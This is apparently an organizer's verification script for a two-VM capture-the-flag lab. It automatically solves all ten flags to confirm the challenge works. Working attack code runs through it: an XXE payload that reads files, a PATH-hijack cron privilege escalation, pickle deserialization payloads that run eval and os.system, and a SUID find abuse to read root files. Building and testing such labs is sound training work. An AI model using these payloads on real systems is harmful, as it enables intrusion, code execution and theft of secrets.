#!/usr/bin/env bash
# verify.sh — proves all 10 flags end-to-end against the freshly
# provisioned pair of VMs, the same way a player would: HTTP against
# frontdesk's published port (via the host's own hostfwd, exactly what
# a player hitting the OVA's NAT-forwarded port would see), then SSH
# as clerk, then pivoting through clerk's shell to reach backoffice
# over the internal link -- never via any build-only shortcut.
set -euo pipefail
cd "$(dirname "$0")/.."

WEB_PORT=8004
SSH_PORT=2204
CLERK_PASS="Cl3rk-Front2024!"
RELEASE_SECRET=$(cat ../organizer/release-secret.txt)

check() {
    local n="$1" got="$2"
    local want
    want=$(python3 -c "
import hmac, hashlib
d = hmac.new('$RELEASE_SECRET'.encode(), f'master-two-offices:$n'.encode(), hashlib.sha256).hexdigest()
print(f'HLC{{{d[:10]}}}')")
    if [ "$got" = "$want" ]; then
        echo "flag $n: OK ($got)"
    else
        echo "flag $n: MISMATCH got='$got' want='$want'" >&2
        exit 1
    fi
}

SSH() { sshpass -p "$CLERK_PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p "$SSH_PORT" clerk@localhost "$@"; }

echo "== flag 1: page source =="
F1=$(curl -s "http://localhost:$WEB_PORT/" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 1 "$F1"

echo "== flag 2: default creds =="
F2=$(curl -s -d "username=branch_staff&password=branch2024" "http://localhost:$WEB_PORT/login" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 2 "$F2"

echo "== flag 3: XXE file read =="
F3=$(curl -s -X POST -H "Content-Type: application/xml" "http://localhost:$WEB_PORT/import-schedule" --data-binary \
    '<?xml version="1.0"?><!DOCTYPE schedule [<!ENTITY xxe SYSTEM "file:///opt/frontdesk/secret/flag3.txt">]><schedule><name>&xxe;</name></schedule>' \
    | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 3 "$F3"

echo "== flag 4: XXE discloses clerk's SSH creds, then SSH in =="
F4=$(SSH 'cat flag4.txt')
check 4 "$F4"

echo "== flag 5: PATH-hijack cron privesc =="
SSH '
mkdir -p /tmp/loot
cat > /opt/admin/bin/backup-helper <<EOF
#!/bin/bash
cp /root/secret/* /tmp/loot/
chmod 644 /tmp/loot/*
EOF
chmod +x /opt/admin/bin/backup-helper
'
echo "Waiting up to 70s for the next cron tick..." >&2
for i in $(seq 1 70); do
    if SSH 'test -f /tmp/loot/flag5.txt' 2>/dev/null; then break; fi
    sleep 1
done
F5=$(SSH 'cat /tmp/loot/flag5.txt')
check 5 "$F5"
FRAG_A=$(SSH 'cat /tmp/loot/fragmentA.txt')

echo "== flag 6: lateral recon on backoffice via the internal link =="
F6=$(SSH 'curl -s http://backoffice:6000/' | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 6 "$F6"

echo "== flag 7: pickle deserialization RCE =="
PAYLOAD7=$(python3 -c "
import pickle, base64
class E:
    def __reduce__(self):
        return (eval, (\"open('/opt/backoffice/secret/flag7.txt').read()\",))
print(base64.b64encode(pickle.dumps(E())).decode())
")
F7=$(SSH "curl -s -X POST --data-urlencode 'data=$PAYLOAD7' http://backoffice:6000/api/process" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 7 "$F7"

echo "== flag 8: same RCE, a second file =="
PAYLOAD8=$(python3 -c "
import pickle, base64
class E:
    def __reduce__(self):
        return (eval, (\"open('/opt/backoffice/secret/flag8.txt').read()\",))
print(base64.b64encode(pickle.dumps(E())).decode())
")
F8=$(SSH "curl -s -X POST --data-urlencode 'data=$PAYLOAD8' http://backoffice:6000/api/process" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 8 "$F8"

echo "== flag 9 + fragment B: SUID find privesc, via the same RCE =="
PAYLOAD9=$(python3 -c "
import pickle, base64, os
cmd = r'find /root/secret/flag9.txt -exec cat {} /root/secret/fragmentB.txt \; > /tmp/root_loot.txt; chmod 644 /tmp/root_loot.txt'
class E:
    def __reduce__(self):
        return (os.system, (cmd,))
print(base64.b64encode(pickle.dumps(E())).decode())
")
SSH "curl -s -X POST --data-urlencode 'data=$PAYLOAD9' http://backoffice:6000/api/process" >/dev/null
PAYLOAD9b=$(python3 -c "
import pickle, base64
class E:
    def __reduce__(self):
        return (eval, (\"open('/tmp/root_loot.txt').read()\",))
print(base64.b64encode(pickle.dumps(E())).decode())
")
ROOT_LOOT=$(SSH "curl -s -X POST --data-urlencode 'data=$PAYLOAD9b' http://backoffice:6000/api/process")
F9=$(echo "$ROOT_LOOT" | grep -oE 'HLC\{[a-f0-9]{10}\}')
check 9 "$F9"
FRAG_B=$(echo "$ROOT_LOOT" | grep -oE '[a-f0-9]{20}' | tail -1)

echo "== flag 10: combine both fragments to decrypt final.enc =="
curl -s "http://localhost:$WEB_PORT/final.enc" -o /tmp/master_final.enc
F10=$(python3 -c "
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

MAGIC = b'HLCX1'
with open('/tmp/master_final.enc', 'rb') as f:
    blob = f.read()
rest = blob[len(MAGIC):]
salt, nonce, ct = rest[:16], rest[16:28], rest[28:]
key = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1).derive('${FRAG_A}${FRAG_B}'.encode())
print(AESGCM(key).decrypt(nonce, ct, None).decode())
")
check 10 "$F10"
rm -f /tmp/master_final.enc

echo
echo "All 10 flags verified end-to-end."
